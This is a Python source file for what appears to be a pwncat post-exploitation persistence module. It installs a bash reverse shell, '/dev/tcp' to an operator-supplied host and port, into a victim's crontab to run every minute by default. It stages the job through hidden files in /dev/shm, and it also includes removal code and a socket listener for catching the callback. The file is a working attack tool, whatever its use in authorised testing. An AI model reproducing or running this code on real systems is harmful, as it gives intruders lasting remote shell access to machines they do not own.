#!/usr/bin/env python3
import pwncat, random, os
from crontab import CronTab
from pwncat.modules import Argument, Status, PersistType, PersistError
from pwncat.modules.persist import PersistModule

# For connect function, pulled from said function, thanks :)
from colorama import Fore
import ipaddress
import os.path
import socket
import re

import paramiko
from prompt_toolkit import prompt
from rich.progress import Progress, BarColumn

import pwncat
from pwncat.util import console
from pwncat.commands.base import (
    CommandDefinition,
    Complete,
    Parameter,
    StoreForAction,
    StoreConstOnce,
)


class Module(PersistModule):
    """ Install a reverse shell (executed by /bin/bash) in the current user's crontab """
    TYPE = PersistType.REMOTE
    ARGUMENTS = {
            **PersistModule.ARGUMENTS,
            "lhost": Argument(
                str, help="The host to call back to"
                ),
            "lport": Argument(
                int, default=4444, help="The port to call back to"
                ),
            "schedule": Argument(
                str, default="* * * * *", help="The cron schedule"
                ),
            "shell": Argument(
                str, default="current", help="The shell to assign for the user"
                ),
            }
    PLATFORM = pwncat.platform.Platform.LINUX

    def install(self, user, lhost, lport, schedule, shell):
        # Interesting note: was tested on a raspberry pi (gen 3) and failed every time. No error was raised. No matter what "pwncat.victim.run" was populated with, it would not execute. I later bricked my pi in testing, test on your own pi at your own discretion lol
        if shell == "current":
            shell = pwncat.victim.shell
            
        try:
            user_entries = pwncat.victim.env(["crontab", "-l"]).decode("utf-8") #stolen from enum/cron.py module, thanks :)
            # using random data to test write privileges
            randint = str(random.randint(1024, 65535)).strip()
            cron = CronTab(user=True)
            job = cron.new(command='echo ' + randint)
            job.minute.every(1)
            with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
                flip.write(f"{job}\n")
            pwncat.victim.run("crontab /dev/shm/.pwncron")
        except (PermissionError) as exc:
            raise PersistError(str(exc))

        # removing random data
        pwncat.victim.env(["rm", "/dev/shm/.pwncron"])

        if schedule != "" and lhost != "" and lport != "":
        	payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 0>&1'")
        	job = cron.new(command=payload)
        	c = 0
        	for number in schedule.split():
        		if number != str("*"):
        			if c == 0:
        				job.minute.every(schedule.split()[0]) # 0-59
        			if c == 1:
        				job.hour.every(schedule.split()[1]) # 0-23
        			if c == 2:
        				job.day.on(schedule.split()[2]) # 1-31
        			if c == 3:
        				job.month.on(schedule.split()[3]) # 1-12
        			if c == 4:
        				job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
        		c += 1
        		# if number = * then do not set, the crontab module assumes that as default

        	# Using files to write to crontab because previous efforts to pipe to crontab failed
        	if str("no crontab") in str(user_entries):
        		with pwncat.victim.open("/dev/shm/.pwncron","w") as flip:
        			flip.write(f"{job}\n")
        	else:
        		 with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
        		 	flip.write(f"{user_entries}")
        		 	flip.write(f"{job}\n")
        	pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
        	pwncat.victim.env(["rm", "/dev/shm/.pwncron"])
        yield Status("Reverse Shell Cron Installed")

    def remove(self, user, lhost, lport, schedule, shell):
        """ Remove any modifications from the remote victim """
        if shell == "current":
            shell = pwncat.victim.shell
            
        try:
        	# This will include what we want to remove
            user_entries = pwncat.victim.env(["crontab", "-l"]).decode("utf-8") #stolen from enum/cron.py module, thanks :)
            # using random data to test write privileges
            randint = str(random.randint(1024, 65535)).strip()
            cron = CronTab(user=True)
            job = cron.new(command='echo ' + randint)
            job.minute.every(1)
            with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
                flip.write(f"{job}\n")
            pwncat.victim.run("crontab /dev/shm/.pwncron")
        except (PermissionError) as exc:
            raise PersistError(str(exc))

        # removing random data
        pwncat.victim.env(["rm", "/dev/shm/.pwncron"])

        if schedule != "" and lhost != "" and lport != "":
        	payload = str("bash -c 'bash -i > /dev/tcp/" + str(lhost) + "/" + str(lport) + " 0>&1'")
        	job = cron.new(command=payload)
        	c = 0
        	for number in schedule.split():
        		if number != str("*"):
        			if c == 0:
        				job.minute.every(schedule.split()[0]) # 0-59
        			if c == 1:
        				job.hour.every(schedule.split()[1]) # 0-23
        			if c == 2:
        				job.day.on(schedule.split()[2]) # 1-31
        			if c == 3:
        				job.month.on(schedule.split()[3]) # 1-12
        			if c == 4:
        				job.dow.on(schedule.split()[4]) # 0-6 (0 = Sunday)
        		c += 1
        	
        	with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
        		flip.write(f"{user_entries}")
        	
        	pwncat.victim.run(f'grep -v "{str(lhost)}" /dev/shm/.pwncron | grep -v "{str(lport)}" | grep -v "{str(schedule)}" > /dev/shm/.nopwncron').strip().decode("utf-8")
        	pwncat.victim.env(["crontab", "/dev/shm/.nopwncron"])
        	pwncat.victim.env(["rm", "/dev/shm/.nopwncron", "/dev/shm/.pwncron"])

        yield Status("Reverse Shell Cron Removed")

    def escalate(self, user, lhost, lport, schedule, shell):
        """ Locally escalate privileges with this module """

        # Not sure how implement this

        # A few theories:
        	# 1. if lhost is a domain and we have write privileges to /etc/hosts, then reroute lhost to 0.0.0.0 (victim's localhost) and open a socket on the victim to catch it
        	# 2. I imagine there is something I am missing about the user variable that may be useful here...

        yield Status("Update the status information")
        return "exit command used to leave this new shell"

    def connect(self, user, lhost, lport, schedule, shell):
        """ Pulled from connect.py, thank you :) """
        with Progress(
                f"bound to [blue]{lhost}[/blue]:[cyan]{lport}[/cyan]",
                BarColumn(bar_width=None),
                transient=True,
            ) as progress:
                task_id = progress.add_task("listening", total=1, start=False)
                # Create the socket server
                server = socket.create_server((lhost, lport), reuse_port=True)

                try:
                    # Wait for a connection
                    (client, address) = server.accept()
                except KeyboardInterrupt:
                    progress.update(task_id, visible=False)
                    progress.log("[red]aborting[/red] listener")
                    return

                progress.update(task_id, visible=False)
                progress.log(
                    f"[green]received[/green] connection from [blue]{address[0]}[/blue]:[cyan]{address[1]}[/cyan]"
                )